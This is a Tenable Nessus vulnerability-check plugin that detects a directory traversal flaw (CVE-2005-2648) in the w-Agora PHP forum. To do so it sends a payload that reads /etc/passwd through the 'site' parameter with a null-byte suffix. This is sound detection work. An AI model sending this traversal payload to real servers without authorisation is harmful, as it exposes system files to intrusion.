#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19474);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/11/15 19:41:08 $");

  script_cve_id("CVE-2005-2648");
  script_bugtraq_id(14597);
  script_osvdb_id(18831);

  script_name(english:"w-Agora index.php site Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks for directory traversal in w-Agora");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has a directory traversal
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running w-agora, a web-based forum application
written in PHP.

The remote version of this software is prone to directory traversal
attacks.  A remote attacker could request a specially crafted URL to
read arbitrary files on the remote system with the privileges of the
web server process."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/fulldisclosure/2005/Aug/597"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to the latest version of this software."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/08/22");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/08/18");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_dependencie("http_version.nasl", "web_traversal.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0, 'Port '+port+' is closed.');
if (get_kb_item("www/"+port+"/generic_traversal"))
  exit(0, 'The web server on port '+port+' is vulnerable to web directory traversal.');


foreach dir ( cgi_dirs() )
{
  u = string(dir, "/index.php?site=../../../../../../../../etc/passwd%00");
  req = http_get(item: u, port:port);
  result = http_keepalive_send_recv(port:port, data:req);
  if(result == NULL) exit(1, 'The web server on port '+port+' failed to respond.');
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))
  {
   if (report_verbosity > 0)
   {
     txt = '\nThis URL returns the content of /etc/passwd :\n' +
     	 build_url(port: port, qs: u) + '\n';
     security_warning(port:port, extra: txt);
   }
   else
     security_warning(port);
   exit(0);
  }
}

exit(0, 'The web server on port '+port+' is not vulnerable.');
